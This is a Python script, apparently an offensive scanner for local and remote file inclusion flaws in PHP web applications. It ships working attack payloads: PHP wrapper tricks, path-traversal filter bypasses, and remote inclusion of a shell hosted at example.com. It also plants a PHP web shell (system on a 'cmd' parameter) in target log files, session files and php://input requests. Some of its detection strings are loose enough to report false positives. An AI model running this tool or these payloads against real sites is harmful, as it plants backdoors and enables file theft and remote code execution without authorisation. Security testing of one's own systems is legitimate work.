#!/usr/bin/env python3
"""
Advanced Local File Inclusion (LFI) Scanner
Tests for LFI vulnerabilities including PHP wrappers, log poisoning,
session file inclusion, and filter bypasses
"""

import requests
import json
import base64
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse

class AdvancedLFIScanner:
    """Advanced LFI vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run advanced LFI tests"""
        print(f"[*] Starting advanced LFI testing on {self.target_url}")

        # Test PHP wrappers
        self._test_php_wrappers()

        # Test log poisoning
        self._test_log_poisoning()

        # Test session file inclusion
        self._test_session_inclusion()

        # Test filter bypasses
        self._test_filter_bypasses()

        # Test remote file inclusion
        self._test_rfi()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_php_wrappers(self):
        """Test PHP wrapper exploitation"""
        print("[*] Testing PHP wrappers...")

        # PHP wrapper payloads
        wrapper_payloads = [
            # php://filter to read source code
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'PHP Filter - Base64'),
            ('php://filter/convert.base64-encode/resource=index.php', 'PHP Filter - Source Disclosure'),
            ('php://filter/read=string.rot13/resource=/etc/passwd', 'PHP Filter - ROT13'),

            # php://input for code execution
            ('php://input', 'PHP Input - RCE'),

            # data:// wrapper
            ('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', 'Data Wrapper - RCE'),
            ('data://text/plain,<?php system($_GET["cmd"]); ?>', 'Data Wrapper - Plain'),

            # expect:// wrapper
            ('expect://id', 'Expect Wrapper - Command Execution'),
            ('expect://whoami', 'Expect Wrapper - User Info'),

            # zip:// wrapper
            ('zip://uploads/shell.zip%23shell.php', 'ZIP Wrapper - File Inclusion'),

            # phar:// wrapper
            ('phar://uploads/shell.phar/shell.php', 'PHAR Wrapper - Inclusion'),
        ]

        for payload, description in wrapper_payloads:
            if self._test_lfi_payload(payload, description):
                return

    def _test_log_poisoning(self):
        """Test log file poisoning"""
        print("[*] Testing log poisoning...")

        # Common log file locations
        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/var/www/logs/access.log',
            '/var/www/logs/error.log',
            '/usr/local/apache/logs/access_log',
            '/usr/local/apache/logs/error_log',
        ]

        # First, poison the log by sending malicious User-Agent
        poison_payload = '<?php system($_GET["cmd"]); ?>'

        try:
            # Poison the log
            poison_headers = {'User-Agent': poison_payload}
            self.session.get(self.target_url, headers=poison_headers, timeout=5)
        except:
            pass

        # Then try to include the log files
        for log_file in log_files:
            if self._test_lfi_payload(log_file, f'Log Poisoning - {log_file}'):
                return

    def _test_session_inclusion(self):
        """Test session file inclusion"""
        print("[*] Testing session file inclusion...")

        # Session file locations
        session_paths = [
            '/tmp/sess_',
            '/var/lib/php/sessions/sess_',
            '/var/lib/php5/sess_',
            '/var/lib/php/session/sess_',
            'C:\\Windows\\Temp\\sess_',
        ]

        # Try to poison session first
        try:
            # Set session variable with PHP code
            session_data = {'name': '<?php system($_GET["cmd"]); ?>'}
            self.session.post(self.target_url, data=session_data, timeout=10)

            # Get session ID from cookies
            session_id = None
            for cookie in self.session.cookies:
                if 'sess' in cookie.name.lower() or 'phpsessid' in cookie.name.lower():
                    session_id = cookie.value
                    break

            if session_id:
                # Try to include session file
                for session_path in session_paths:
                    session_file = session_path + session_id
                    if self._test_lfi_payload(session_file, f'Session File Inclusion - {session_path}'):
                        return

        except:
            pass

    def _test_filter_bypasses(self):
        """Test filter bypass techniques"""
        print("[*] Testing filter bypasses...")

        # Bypass payloads
        bypass_payloads = [
            # Null byte injection (PHP < 5.3.4)
            ('/etc/passwd%00', 'Null Byte Bypass'),
            ('/etc/passwd%00.jpg', 'Null Byte with Extension'),

            # Encoding bypasses
            ('/etc/passwd', 'Direct Path'),
            ('....//....//....//etc/passwd', 'Dot-Slash Bypass'),
            ('..%2f..%2f..%2fetc%2fpasswd', 'URL Encoding'),
            ('..%252f..%252f..%252fetc%252fpasswd', 'Double URL Encoding'),

            # Unicode bypasses
            ('..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'Unicode Bypass'),
            ('..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd', 'Overlong UTF-8'),

            # Case manipulation
            ('/EtC/PaSsWd', 'Case Manipulation'),

            # Backslash (Windows)
            ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'Windows Backslash'),
            ('..\\..\\..\\boot.ini', 'Windows boot.ini'),

            # UNC paths (Windows)
            ('\\\\localhost\\c$\\windows\\system32\\drivers\\etc\\hosts', 'UNC Path'),
        ]

        for payload, description in bypass_payloads:
            if self._test_lfi_payload(payload, description):
                return

    def _test_rfi(self):
        """Test Remote File Inclusion"""
        print("[*] Testing Remote File Inclusion (RFI)...")

        # RFI payloads (use safe test URLs)
        rfi_payloads = [
            ('http://example.com/shell.txt', 'RFI - HTTP'),
            ('https://example.com/shell.txt', 'RFI - HTTPS'),
            ('//example.com/shell.txt', 'RFI - Protocol Relative'),
            ('http://127.0.0.1/shell.php', 'RFI - Localhost'),
        ]

        for payload, description in rfi_payloads:
            if self._test_lfi_payload(payload, description):
                return

    def _test_lfi_payload(self, payload, description):
        """Test single LFI payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Common parameter names for LFI
        lfi_params = ['file', 'page', 'include', 'path', 'document', 'folder', 'root', 'pg', 'style', 'pdf', 'template', 'php_path', 'doc']

        # Find parameter to inject into
        target_param = None
        for param in lfi_params:
            if param in params:
                target_param = param
                break

        if not target_param and params:
            # Use first parameter
            target_param = list(params.keys())[0]

        if not target_param:
            # Try common parameters anyway
            target_param = 'file'

        # Build test URL
        test_params = params.copy()
        test_params[target_param] = [payload]

        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

        try:
            # For php://input, send POST with PHP code
            if payload == 'php://input':
                response = self.session.post(test_url, data='<?php system($_GET["cmd"]); ?>', timeout=15)
            else:
                response = self.session.get(test_url, timeout=15, allow_redirects=False)

            # Check for LFI indicators
            lfi_indicators = [
                'root:x:0:0',  # /etc/passwd
                'daemon:',     # /etc/passwd entries
                'bin:',
                'sys:',
                '[boot loader]',  # boot.ini
                'localhost',
                '127.0.0.1',
                '# Copyright',  # hosts file
                'PD9waHAgc3lzdGVtKCRfR0VUW',  # Base64 PHP code
                '<?php',  # PHP source code
                'function',  # Source code disclosure
            ]

            for indicator in lfi_indicators:
                if indicator in response.text:
                    severity = 'critical'

                    # Determine severity based on what was found
                    if 'root:x:0:0' in response.text or 'daemon:' in response.text:
                        severity = 'critical'
                        evidence = f'{description} - /etc/passwd disclosed'
                        impact = 'Read sensitive files, enumerate users'
                    elif '<?php' in response.text or 'function' in response.text:
                        severity = 'critical'
                        evidence = f'{description} - Source code disclosed'
                        impact = 'Source code disclosure, find hardcoded credentials'
                    elif 'PD9waHAgc3lzdGVtKCRfR0VUW' in response.text:
                        severity = 'critical'
                        evidence = f'{description} - Base64 encoded source disclosed'
                        impact = 'Read arbitrary files encoded in base64'
                    else:
                        severity = 'high'
                        evidence = f'{description} - Found: {indicator}'
                        impact = 'Read local files, possible RCE'

                    vuln = {
                        'type': 'Local File Inclusion (LFI)',
                        'severity': severity,
                        'url': test_url,
                        'payload': payload,
                        'parameter': target_param,
                        'evidence': evidence,
                        'description': f'LFI via {description}',
                        'cwe': 'CWE-98' if 'RFI' in description else 'CWE-98',
                        'impact': impact,
                        'remediation': 'Use allowlist for file inclusion, disable dangerous PHP wrappers'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] LFI found: {description}")
                    return True

            # Check for base64 in response (php://filter)
            if 'php://filter' in payload and 'base64' in payload:
                # Response might be base64 encoded file
                try:
                    # Try to decode response
                    decoded = base64.b64decode(response.text)
                    if b'<?php' in decoded or b'root:' in decoded or b'function' in decoded:
                        vuln = {
                            'type': 'Local File Inclusion (LFI) - PHP Filter',
                            'severity': 'critical',
                            'url': test_url,
                            'payload': payload,
                            'parameter': target_param,
                            'evidence': 'PHP filter returned base64 encoded file content',
                            'description': 'LFI via PHP filter wrapper (source disclosure)',
                            'cwe': 'CWE-98',
                            'impact': 'Read arbitrary files, disclose source code',
                            'remediation': 'Disable PHP wrappers in php.ini (allow_url_include=Off)'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] LFI found: PHP Filter Base64")
                        return True
                except:
                    pass

        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 file_inclusion_advanced.py <url> [output_file]")
        print("\nExample:")
        print("  python3 file_inclusion_advanced.py 'https://example.com/index.php?file=home'")
        print("\nTests for:")
        print("  - PHP wrappers (php://filter, data://, expect://)")
        print("  - Log file poisoning (inject code into logs)")
        print("  - Session file inclusion (poison session then include)")
        print("  - Filter bypasses (null byte, encoding, unicode)")
        print("  - Remote File Inclusion (RFI)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = AdvancedLFIScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
